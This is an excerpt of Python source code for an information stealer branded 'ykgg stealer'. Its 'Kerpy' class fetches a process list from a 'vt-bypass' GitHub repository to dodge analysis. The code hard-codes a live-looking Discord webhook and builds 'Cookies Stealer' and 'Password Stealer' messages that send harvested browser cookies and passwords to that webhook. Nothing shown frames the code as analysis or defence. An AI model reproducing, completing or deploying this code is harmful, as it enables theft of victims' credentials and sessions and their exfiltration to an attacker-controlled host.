...
class Kerpy:
    ...
    def processes_and_files_check(self):
        ...
        processl = requests.get("https://raw.githubusercontent.com/13371337/vt-bypass/main/process.txt").text
...
h00k = "https://discord.com/api/webhooks/1088973313134579722/0UpS6HGfO_wpCWl__QO0DCv6RdnSQdiApaNBrVvMeE-Ps3U1fkJ0njuZu2lc_Dr7p0DV"
...
def UP104D(name, link):
    ...
    if name == "cscook":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "ykgg | Cookies Stealer",
                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:browser:1069111130422771812> • **{C00K1C0UNt}** Cookies Found\n <:blackarrow:1069101795827269632> • [ykggCookies.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "ykgg stealer",
                        "icon_url": "https://cdn.discordapp.com/attachments/1068665758755860571/1068919202041311342/GIF-210621_214354.gif"
    ...
    if name == "cspassw":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "ykgg | Password Stealer",
                    "description": f"**Found**:\n{ra}\n\n**Data:**\n <:blacklock:1069101792736051221> • **{P455WC0UNt}** Passwords Found\n <:blackarrow:1069101795827269632> • [ykggPasswords.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "ykgg stealer",
                        "icon_url": "https://cdn.discordapp.com/attachments/1068665758755860571/1068919202041311342/GIF-210621_214354.gif"
